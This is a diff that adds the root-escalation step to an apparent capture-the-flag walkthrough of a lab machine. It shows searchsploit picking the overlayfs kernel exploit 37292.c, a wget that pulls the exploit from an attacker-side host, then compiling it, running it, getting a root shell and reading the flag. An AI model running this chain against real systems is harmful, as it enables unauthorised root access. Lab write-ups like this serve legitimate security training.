@@ -258,8 +258,52 @@ SUPPORT_URL="http://help.ubuntu.com/"
 BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
 ```
 
+using searchsploit we find the correct exploit :
 
+```text
+root@kali: searchsploit kernel 3.13
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation  | linux/local/37292.c
+```
 
+upload it on victim and compile it :
+
+```text
+$ wget http://192.168.56.102/37292.c
+--2023-09-26 13:10:36--  http://192.168.56.102/37292.c
+Connecting to 192.168.56.102:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4968 (4.9K) [text/x-csrc]
+Saving to: ‘37292.c’
+
+100%[========================================================>] 4,968       --.-K/s   in 0s
+
+2023-09-26 13:10:36 (92.3 MB/s) - ‘37292.c’ saved [4968/4968]
+
+$ gcc 37292.c
+$ ls
+37292.c  a.out
+
+$ ./a.out
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(webmin)
+
+# cd /root
+
+# cat flag.txt
+Hello and welcome.
+You successfully compromised the company "JABC" and the server completely !!
+Congratulations !!!
+Hope you enjoyed it.
+
+What do you think of A.I.?
+```
 
 
 
